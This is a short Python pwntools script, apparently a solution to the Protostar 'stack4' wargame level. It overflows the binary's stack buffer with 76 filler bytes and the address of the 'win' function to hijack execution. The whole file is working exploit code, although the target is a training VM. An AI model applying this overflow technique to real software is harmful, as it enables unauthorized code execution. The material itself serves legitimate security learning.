#!/usr/bin/python
from pwn import *
import os
from ssh import *

binarypath='/opt/protostar/bin/stack4'
sh.download(binarypath)
elf=ELF('./stack4')
p=sh.run(binarypath)
win=elf.symbols['win']
payload="A"*76+p32(win)
p.sendline(payload)
print p.recvall()
os.system('rm stack4')